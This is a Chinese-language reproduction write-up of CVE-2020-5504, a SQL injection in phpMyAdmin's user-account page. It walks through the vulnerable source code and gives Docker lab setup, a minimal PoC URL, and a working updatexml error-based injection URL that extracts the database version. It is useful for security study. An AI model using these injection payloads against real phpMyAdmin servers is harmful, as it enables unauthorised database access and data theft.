<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞</h1><h2>一、漏洞简介</h2><p>在用户帐户页面中发现了一个SQL注入漏洞。创建对此页面的查询时，恶意用户可能会注入自定义SQL来代替其自己的用户名。攻击者必须具有有效的MySQL帐户才能访问服务器。</p><h2>二、漏洞影响</h2><p>Phpmyadmin &lt;= 5.00</p><p>Phpmyadmin &lt;= 4.94</p><h2>三、复现过程</h2><h3>环境搭建</h3><p>docker一把梭</p><p>docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6</p><p>`docker run --name myadmin -d --link mysql5.7:db -p 8080:80 phpmyadmin/phpmyadmin:5.0</p><h3>溯源和构造poc</h3><p>下载前一个版本 5.0.0的<a href="https://files.phpmyadmin.net/phpMyAdmin/5.0.0/phpMyAdmin-5.0.0-english.zip">代码压缩包</a>后, 打开libraries/classes/Server/Privileges.php 来到对应行.</p><p>if (isset($_GET['validate_username'])) {<br />            $sql_query = &quot;SELECT * FROM `mysql`.`user` WHERE `User` = '&quot;<br />                . $_GET['username'] . &quot;';&quot;;<br />            // 省略 节省篇幅<br />        }</p><p>很显然可以看出注入点是$_GET['username'],而需要设置$_GET['validate_username']</p><p>往上看, 这段代码位于public function getExtraDataForAjaxBehavior函数.</p><p>搜索上层调用来到/server_privileges.php 的这段代码</p><p>if ($response-&gt;isAjax()<br />    &amp;&amp; empty($_REQUEST['ajax_page_request'])<br />    &amp;&amp; ! isset($_GET['export'])<br />    &amp;&amp; (! isset($_POST['submit_mult']) || $_POST['submit_mult'] != 'export')<br />    &amp;&amp; ((! isset($_GET['initial']) || $_GET['initial'] === null<br />    || $_GET['initial'] === '')<br />    || (isset($_POST['delete']) &amp;&amp; $_POST['delete'] === __('Go')))<br />    &amp;&amp; ! isset($_GET['showall'])<br />    &amp;&amp; ! isset($_GET['edit_user_group_dialog'])<br />) {<br />    $extra_data = $serverPrivileges-&gt;getExtraDataForAjaxBehavior(<br />        (isset($password) ? $password : ''),<br />        (isset($sql_query) ? $sql_query : ''),<br />        (isset($hostname) ? $hostname : ''),<br />        (isset($username) ? $username : '')<br />    );<br /><br />    if (! empty($message) &amp;&amp; $message instanceof Message) {<br />        $response-&gt;setRequestStatus($message-&gt;isSuccess());<br />        $response-&gt;addJSON('message', $message);<br />        $response-&gt;addJSON($extra_data);<br />        exit;<br />    }<br />}</p><p>可以发现if里大部分条件都可控, 除了$response-&gt;isAjax()</p><p>public function isAjax(): bool<br />    {<br />        return $this-&gt;_isAjax;<br />    }</p><p>查看构造函数</p><p>/**<br />     * Creates a new class instance<br />     */<br />    private function __construct()<br />    {<br />        if (! defined('TESTSUITE')) {<br />            $buffer = OutputBuffering::getInstance();<br />            $buffer-&gt;start();<br />            register_shutdown_function([$this, 'response']);<br />        }<br />        $this-&gt;_header = new Header();<br />        $this-&gt;_HTML   = '';<br />        $this-&gt;_JSON   = [];<br />        $this-&gt;_footer = new Footer();<br /><br />        $this-&gt;_isSuccess  = true;<br />        $this-&gt;_isDisabled = false;<br />        $this-&gt;setAjax(! empty($_REQUEST['ajax_request']));<br />        $this-&gt;_CWD = getcwd();<br />    }</p><p>可以看到这条件在于$_REQUEST['ajax_request']是否为空.</p><p>根据上面的几个条件 我们可以构造出如下最简单的poc</p><p>http://127.0.0.1:8080/server_privileges.php?ajax_request=true&amp;validate_username=true&amp;username=test%27%22</p><p>登陆后(这个操作需要权限) 尝试访问上面的url.返回如下</p><p>{&quot;success&quot;:false,&quot;error&quot;:&quot;&lt;div class=\&quot;error\&quot;&gt;&lt;h1&gt;Error&lt;\/h1&gt;&lt;p&gt;&lt;strong&gt;Static analysis:&lt;\/strong&gt;&lt;\/p&gt;&lt;p&gt;1 errors were found during analysis.&lt;\/p&gt;&lt;p&gt;&lt;ol&gt;&lt;li&gt;Ending quote \&quot; was expected. (near \&quot;\&quot; at position 53)&lt;\/li&gt;&lt;\/ol&gt;&lt;\/p&gt;&lt;p&gt;&lt;strong&gt;SQL query:&lt;\/strong&gt;  &lt;a href=\&quot;#\&quot; class=\&quot;copyQueryBtn\&quot; data-text=\&quot;SELECT * FROM `mysql`.`user` WHERE `User` = 'test'&amp;quot;';\&quot;&gt;Copy&lt;\/a&gt;\n&lt;a href=\&quot;.\/url.php?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.6%2Fen%2Fselect.html\&quot; target=\&quot;mysql_doc\&quot;&gt;&lt;img src=\&quot;themes\/dot.gif\&quot; title=\&quot;Documentation\&quot; alt=\&quot;Documentation\&quot; class=\&quot;icon ic_b_help\&quot;&gt;&lt;\/a&gt;&lt;a href=\&quot;server_sql.php?sql_query=SELECT+%2A+FROM+%60mysql%60.%60user%60+WHERE+%60User%60+%3D+%27test%27%22%27%3B&amp;amp;show_query=1\&quot;&gt;&lt;span class=\&quot;nowrap\&quot;&gt;&lt;img src=\&quot;themes\/dot.gif\&quot; title=\&quot;Edit\&quot; alt=\&quot;Edit\&quot; class=\&quot;icon ic_b_edit\&quot;&gt;&amp;nbsp;Edit&lt;\/span&gt;&lt;\/a&gt;    &lt;\/p&gt;\n&lt;p&gt;\nSELECT * FROM `mysql`.`user` WHERE `User` = 'test'&amp;quot;';\n&lt;\/p&gt;\n&lt;p&gt;\n    &lt;strong&gt;MySQL said: &lt;\/strong&gt;&lt;a href=\&quot;.\/url.php?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.6%2Fen%2Ferror-messages-server.html\&quot; target=\&quot;mysql_doc\&quot;&gt;&lt;img src=\&quot;themes\/dot.gif\&quot; title=\&quot;Documentation\&quot; alt=\&quot;Documentation\&quot; class=\&quot;icon ic_b_help\&quot;&gt;&lt;\/a&gt;\n&lt;\/p&gt;\n&lt;code&gt;#1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&amp;quot;'' at line 1&lt;\/code&gt;&lt;br&gt;&lt;\/div&gt;&quot;}</p><p>一个sql报错信息, 说明这个最短poc生效了</p><p>利用的话 反正都回显了 直接updatexml报错注入</p><p>http://127.0.0.1:8080/server_privileges.php?ajax_request=true&amp;validate_username=true&amp;username=test%27%20and%20(select%20updatexml(1,concat(0x7e,(SELECT%20@@version),0x7e),1))%20--%20</p><p>在返回最下面可以看到#1105 - XPATH syntax error: '~5.6.46~'</p><h3>后言</h3><p>这个洞要求一个可以登录的账号才能注入. , 另外这个请求似乎也不需要csrf-token(不过似乎没什么用)</p><h2>参考链接</h2><p><a href="https://xz.aliyun.com/t/7092">https://xz.aliyun.com/t/7092</a></p></body></html>